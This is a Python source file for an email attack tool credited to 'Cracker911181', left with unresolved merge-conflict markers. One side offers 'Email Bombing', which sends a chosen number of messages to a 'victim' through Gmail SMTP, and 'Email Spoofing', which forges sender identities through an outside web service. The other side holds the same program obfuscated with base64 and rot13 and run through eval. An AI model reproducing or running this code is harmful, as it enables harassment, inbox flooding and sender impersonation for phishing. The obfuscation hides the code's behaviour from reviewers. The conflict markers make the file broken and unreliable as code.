# Coded by Cacker911181
# CRACKER911181



<<<<<<< HEAD

import requests
import time,os,sys
import smtplib
from getpass import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest


def spofEmail():
	os.system("clear")
	try:
		
		fromName=str(input(rosy+"\n\nEnter Sender Name: "+colouroff))
		fromEmail=str(input(rosy+"Enter Sender Email: "+colouroff))
		toEmail=str(input(rosy+"Enter Victim Email: "+colouroff))
		Subject=str(input(rosy+"Enter Mail Subject: "+colouroff))
		body=str(input(rosy+"Enter Your Message: "+colouroff))
		
		data="fromname="+fromName+"&fromemail="+fromEmail+"&toemail="+toEmail+"&subject="+Subject+"&textarea="+body+"&Submit=Send"
		
		url="https://www.email-spoofer.ml"
		
		header={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-J330F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
		
		x=requests.post(url,data=data,headers=header).text
		
		print(green+"\n\n             Email Successfully Send")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	except requests.exceptions.ConnectionError:
		print(red+"\n\n          Check Your Internet Connection")
		input(blue+"\n\n        Press Enter To Back Previous Menu ")
		
	except:
		print(red+"\n\n             Something Went Wrong")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")







def emailBombing():
	
	cracker=smtplib.SMTP("smtp.gmail.com","587")
	cracker.ehlo()
	cracker.starttls()
	
	
	
	
	print(pest+"\n\n              Login Your Gmail Address")
	
	
	fromEmail=str(input(rosy+"\n\nEnter Your Gmail Address: "))
	
	pwd=str(getpass(rosy+"\nEnter Your Gmail Password: "))
	
	
	try:
		cracker.login(fromEmail,pwd)
		os.system("clear")
		
		print(pest+"\n\n                  Login Successfull")
		
		toEmail=str(input(rosy+"\n\nEnter Victim Email: "+red))
		subject=str(input(rosy+"\nEnter Email Subject: "+red))
		body= str(input(rosy+"\nEnter Your Message: "+colouroff))
		amount= str(input(rosy+"\nEnter Your Amount: "+red))
		
		msg = MIMEMultipart()
		msg['From'] = fromEmail
		msg['To'] = toEmail
		msg['Subject'] = subject
		body=body
	
		msg.attach(MIMEText(body, 'plain'))
		text = msg.as_string()
		
		print("\n\n")
		if amount=="":
			amount=0
		for i in range(int(amount)):
			try:
				cracker.sendmail(fromEmail,toEmail,text)
				print(green+"\t\tEmail Send Successfull !")
			#	
			except:
				print(red+"\t\tEmail Not Send!")
	
	
		
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	except smtplib.SMTPAuthenticationError:
		print(red+"\n\n             Password Incorrect or\n    Less Secuire App Access is turned off")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	except TypeError:	
		print(red+"\n\n        Email or Password Field are Empty")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
	
	except:
		print(red+"\n\n              Something Went Wrong")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	
	







while True:
	os.system('clear')
	print(blue+f"""
   ____                _                _____           _
  / ___|_ __ __ _  ___| | _____ _ __   |_   _|__   ___ | |
 """+blue+"""| |   | '__/ _` |/ __| |/ / _ \ '__|____| |/ _ \ / _ \| |
 """+pest+"""| |___| | | (_| | (__|   <  __/ | |_____| | (_) | (_) | |
  \____|_|  \__,_|\___|_|\_\___|_|       |_|\___/ \___/|_|\n\n """+green+"""             Crack Your World, If You Can\n\n\t          """+blue+"""[★] Email Tool [★] \n"""+green+""" ========================================================="""+colouroff)
	

	chose=str(input(pest+"\n\t\t1. Email Bombing\n\t\t2. Email Spofing\n\t\t"+red+"00. Back To Home"+rosy+"\n\nEnter Your Option: "))
	
	
	if chose=="1":
		try:
			os.system("clear")
			emailBombing()
		except:
			print(red+"\n\n              Check Your Internet Connection")
			input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	elif chose=="2":
		try:
			spofEmail()
		except:
			pass
	
	elif chose=="00":
		break
=======
import base64, codecs
magic = 'CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZSxvcyxzeXMKaW1wb3J0IHNtdHBsaWIKZnJvbSBnZXRwYXNzIGltcG9ydCBnZXRwYXNzCmZyb20gZW1haWwubWltZS50ZXh0IGltcG9ydCBNSU1FVGV4dApmcm9tIGVtYWlsLm1pbWUubXVsdGlwYXJ0IGltcG9ydCBNSU1FTXVsdGlwYXJ0CgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKZGVmIHNwb2ZFbWFpbCgpOgoJb3Muc3lzdGVtKCJjbGVhciIpCgl0cnk6CgkJCgkJZnJvbU5hbWU9c3RyKGlucHV0KHJvc3krIlxuXG5FbnRlciBTZW5kZXIgTmFtZTogIitjb2xvdXJvZmYpKQoJCWZyb21FbWFpbD1zdHIoaW5wdXQocm9zeSsiRW50ZXIgU2VuZGVyIEVtYWlsOiAiK2NvbG91cm9mZikpCgkJdG9FbWFpbD1zdHIoaW5wdXQocm9zeSsiRW50ZXIgVmljdGltIEVtYWlsOiAiK2NvbG91cm9mZikpCgkJU3ViamVjdD1zdHIoaW5wdXQocm9zeSsiRW50ZXIgTWFpbCBTdWJqZWN0OiAiK2NvbG91cm9mZikpCgkJYm9keT1zdHIoaW5wdXQocm9zeSsiRW50ZXIgWW91ciBNZXNzYWdlOiAiK2NvbG91cm9mZikpCgkJCgkJZGF0YT0iZnJvbW5hbWU9Iitmcm9tTmFtZSsiJmZyb21lbWFpbD0iK2Zyb21FbWFpbCsiJnRvZW1haWw9Iit0b0VtYWlsKyImc3ViamVjdD0iK1N1YmplY3QrIiZ0ZXh0YXJlYT0iK2JvZHkrIiZTdWJtaXQ9U2VuZCIKCQkKCQl1cmw9Imh0dHBzOi8vd3d3LmVtYWlsLXNwb29mZXIubWwiCgkJCgkJaGVhZGVyPXsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBTTS1KMzMwRiBCdWlsZC9QUFIxLjE4MDYxMC4wMTE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlI'
love = 'RqyL2giXFOJMKWmnJ9hYmDhZPOQnUWioJHiBGLhZP40AwL0YwRjAPOAo2WcoTHtH2SzLKWcYmHmAl4mAvVfVxSwL2IjqP1ZLJ5aqJSaMFV6VzIhYHqPYTIhYIIGB3R9ZP45YTIhB3R9ZP44Va0XPDxXPDy4CKWypKIyp3EmYaOip3DbqKWfYTEuqTR9MTS0LFkbMJSxMKWmCJuyLJEypvxhqTI4qNbWPDbWPKOlnJ50XTqlMJIhXlWpoykhVPNtVPNtVPNtVPNtVRIgLJyfVSA1L2Ayp3AzqJkfrFOGMJ5xVvxXPDycoaO1qPuvoUIyXlWpoykhVPNtVPNtVSOlMKAmVRIhqTIlVSEiVRWuL2ftHUWyqzyiqKZtGJIhqFNvXDbWPDbWMKuwMKO0VUWypKIyp3EmYzI4L2IjqTyioaZhD29hozIwqTyioxIlpz9lBtbWPKOlnJ50XUWyMPfvKT5povNtVPNtVPNtVPOQnTIwnlOMo3IlVRyhqTIlozI0VRAioz5yL3Eco24vXDbWPJyhpUI0XTWfqJHeVykhKT4tVPNtVPNtVSOlMKAmVRIhqTIlVSEiVRWuL2ftHUWyqzyiqKZtGJIhqFNvXDbWPDbWMKuwMKO0BtbWPKOlnJ50XUWyMPfvKT5povNtVPNtVPNtVPNtVPOGo21yqTucozptI2IhqPOKpz9hMlVcPtxWnJ5jqKDbLzk1MFfvKT5povNtVPNtVPODpzImplOSoaEypvOHolOPLJAeVSOlMKMco3ImVR1yoaHtVvxXPtbXPtbXPzEyMvOyoJScoRWioJWcozpbXGbXPDbWL3WuL2gypw1moKEjoTyvYyAAISNbVaAgqUNhM21unJjhL29gVvjvAGt3VvxXPJAlLJAeMKVhMJufoltcPtywpzSwn2IlYaA0LKW0qTkmXPxXPDbWPtxXPDbWpUWcoaDbpTImqPfvKT5povNtVPNtVPNtVPNtVPNtGT9anJ4tJJ91pvOUoJScoPOOMTElMKAmVvxXPDbWPtyzpz9gEJ1unJj9p3ElXTyhpUI0XUWip3xeVykhKT5SoaEypvOMo3IlVRqgLJyfVRSxMUWyp3Z6VPVcXDbWPtyjq2D9p3ElXTqyqUOup3Zbpz9mrFfvKT5SoaEypvOMo3IlVRqgLJyfVSOup3A3o3WxBvNvXFxXPDbWPty0pax6PtxWL3WuL2gypv5fo2qcovuzpz9gEJ1unJjfpUqxXDbWPJ9mYaA5p3EyoFtvL2kyLKVvXDbWPDbWPKOlnJ50XUOyp3DeVykhKT4tVPNtVPNtVPNtVPNtVPNtVPOZo2qcovOGqJAwMKAmMaIfoPVcPtxWPtxWqT9SoJScoQ1mqUVbnJ5jqKDbpz9mrFfvKT5poxIhqTIlVSMcL3EcoFOSoJScoQbtVvglMJDcXD'
god = 'oJCXN1YmplY3Q9c3RyKGlucHV0KHJvc3krIlxuRW50ZXIgRW1haWwgU3ViamVjdDogIityZWQpKQoJCWJvZHk9IHN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgTWVzc2FnZTogIitjb2xvdXJvZmYpKQoJCWFtb3VudD0gc3RyKGlucHV0KHJvc3krIlxuRW50ZXIgWW91ciBBbW91bnQ6ICIrcmVkKSkKCQkKCQltc2cgPSBNSU1FTXVsdGlwYXJ0KCkKCQltc2dbJ0Zyb20nXSA9IGZyb21FbWFpbAoJCW1zZ1snVG8nXSA9IHRvRW1haWwKCQltc2dbJ1N1YmplY3QnXSA9IHN1YmplY3QKCQlib2R5PWJvZHkKCQoJCW1zZy5hdHRhY2goTUlNRVRleHQoYm9keSwgJ3BsYWluJykpCgkJdGV4dCA9IG1zZy5hc19zdHJpbmcoKQoJCQoJCXByaW50KCJcblxuIikKCQlpZiBhbW91bnQ9PSIiOgoJCQlhbW91bnQ9MAoJCWZvciBpIGluIHJhbmdlKGludChhbW91bnQpKToKCQkJdHJ5OgoJCQkJY3JhY2tlci5zZW5kbWFpbChmcm9tRW1haWwsdG9FbWFpbCx0ZXh0KQoJCQkJcHJpbnQoZ3JlZW4rIlx0XHRFbWFpbCBTZW5kIFN1Y2Nlc3NmdWxsICEiKQoJCQkjCQoJCQlleGNlcHQ6CgkJCQlwcmludChyZWQrIlx0XHRFbWFpbCBOb3QgU2VuZCEiKQoJCgkKCQkKCQlpbnB1dChibHVlKyJcblxuICAgICAgIFByZXNzIEVudGVyIFRvIEJhY2sgUHJldmlvdXMgTWVudSAiKQoJCQoJZXhjZXB0IHNtdHBsaWIuU01UUEF1dGhlbnRpY2F0aW9uRXJyb3I6CgkJcHJpbnQocmVkKyJcblxuICAgICAgICAgICAgIFBhc3N3b3JkIEluY29ycmVjdCBvclxuICAgIExlc3MgU2VjdWlyZSBBcHAgQWNjZXNzIGlzIHR1cm5lZCBvZmYiKQoJCWlucHV0KGJsdWUrIlxuXG4gICAgICAgUHJlc3MgRW50ZXIgVG8gQmFjayBQcmV2aW91cyBNZW51ICIpCgkJCglleGNlcHQgVHlwZUVycm9yOgkKCQlwcmludChyZWQrIlxuXG4gICAgICAgIEVtYWlsIG9yIFBhc3N3b3JkIEZpZWxkIGFyZSBFbXB0eSIpCgkJaW5wdXQoYmx1ZSsiXG5cbiAgICAgICBQcmVzcyBFbnRlciBUbyBCYWNrIFByZXZpb3VzIE1lbnUgIikKCQoJZXhjZXB0OgoJCXByaW50KHJlZCsiXG5cbiAgICAgICAgICAgICAgU29tZXRoaW5nIFdlbnQgV3JvbmciKQo'
destiny = 'WPJyhpUI0XTWfqJHeVykhKT4tVPNtVPNtHUWyp3ZtEJ50MKVtIT8tDzSwnlODpzI2nJ91plOAMJ51VPVcPtxWPtxXPDbXPtbXPtbXq2ucoTHtIUW1MGbXPJ9mYaA5p3EyoFtaL2kyLKVaXDbWpUWcoaDbLzk1MFgzVvVvPvNtVS9sK18tVPNtVPNtVPNtVPNtVPNtKlNtVPNtVPNtVPNtVPNtVPOsK19sKlNtVPNtVPNtVPNtKjbtVP8tK19ssS8tK18tK18tKlNtK19ssPO8VS9sK19sVS8tK18tVPO8KlNtVS98K18tVPOsK18tsPO8PvNvVvVeLzk1MFfvVvW8VUjtVPO8VPqsKl8tK2NtsP8tK198VUjiVP8tKlOpVPqsK3ksK19ssPO8YlOsVSjtYlOsVSk8VUjXVPVvVvgjMKA0XlVvVajtsS9sK3jtsPO8VPussPO8VPusK3jtVPN8VPOsKl8tsPO8K19sK198VUjtXS8cVUjtXS8cVUjtsNbtVSksK19ssS98VPOpK18fK3kpK19ssS98KS9pK19ssS98VPNtVPNtVUkssSksK18iVSksK18isS98KT5povNvVvVeM3WyMJ4eVvVvVPNtVPNtVPNtVPNtVRAlLJAeVSyiqKVtI29loTDfVRyzVSyiqFOQLJ5poykhKUDtVPNtVPNtVPNtVvVvX2WfqJHeVvVvJ+XLuI0tEJ1unJjtIT9ioPOo4cvSKFOpovVvVvgapzIyovfvVvVtCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09VvVvX2AioT91pz9zMvxXPDbXPJAbo3AyCKA0pvucoaO1qPujMKA0XlWpoyk0KUDkYvOSoJScoPOPo21vnJ5aKT5pqSk0Zv4tEJ1unJjtH3OiMzyhM1khKUEpqPVepzIxXlVjZP4tDzSwnlOHolOVo21yVvglo3A5XlWpoykhEJ50MKVtJJ91pvOCpUEco246VPVcXDbWPtxXPJyzVTAbo3AyCG0vZFV6PtxWqUW5BtbWPDyipl5mrKA0MJ0bVzAfMJSlVvxXPDxWMJ1unJkPo21vnJ5aXPxXPDyyrTAypUD6PtxWPKOlnJ50XUWyMPfvKT5povNtVPNtVPNtVPNtVPNtD2uyL2ftJJ91pvOWoaEypz5yqPOQo25hMJA0nJ9hVvxXPDxWnJ5jqKDbLzk1MFfvKT5povNtVPNtVPODpzImplOSoaEypvOHolOPLJAeVSOlMKMco3ImVR1yoaHtVvxXPDxXPJIfnJLtL2uip2H9CFVlVwbXPDy0pax6PtxWPKAjo2MSoJScoPtcPtxWMKuwMKO0BtbWPDyjLKAmPtxXPJIfnJLtL2uip2H9CFVjZPV6PtxWLaWyLJf='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
